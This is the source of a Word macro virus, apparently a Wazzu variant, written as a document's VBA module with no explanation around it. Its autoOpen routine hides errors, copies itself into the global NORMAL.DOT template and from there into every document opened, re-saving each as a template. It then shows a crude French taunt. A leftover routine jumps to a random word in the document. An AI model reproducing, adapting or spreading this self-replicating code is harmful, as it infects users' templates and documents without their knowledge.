   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "autoOpen"

   Public Sub MAIN()
   Dim fM$
   Dim glM$
   Dim MF$
       On Error GoTo -1: On Error GoTo errC

       WordBasic.FileSummaryInfo Update:=1
       Dim zut As Object: Set zut = WordBasic.DialogRecord.FileSummaryInfo(False)
       WordBasic.CurValues.FileSummaryInfo zut

       fM$ = zut.Directory + "\" + zut.FileName + ":autoOpen"
       glM$ = "Global:autoOpen"
       MF$ = UCase(WordBasic.[Right$](WordBasic.[MacroFileName$](WordBasic.[MacroName$](0)), 10))

       If MF$ = "NORMAL.DOT" Then
           WordBasic.MacroCopy glM$, fM$
           WordBasic.FileSaveAs Format:=1
       Else
           WordBasic.MacroCopy fM$, glM$
       End If

       Pay

   GoTo bye
   errC:

   bye:
       On Error GoTo -1: On Error GoTo 0

   End Sub

   Private Sub Pay()
       WordBasic.MsgBox "Wazzu n'est pas mort.", "car il bande encore", 48

   End Sub

   Private Sub Merde()
   Dim wordNum
       WordBasic.FileSummaryInfo Update:=1
       Dim zut As Object: Set zut = WordBasic.DialogRecord.DocumentStatistics(False)
       WordBasic.CurValues.DocumentStatistics zut

       wordNum = WordBasic.Int(Rnd() * WordBasic.Val(zut.Words))
       WordBasic.StartOfDocument
       WordBasic.WordRight wordNum
   End Sub
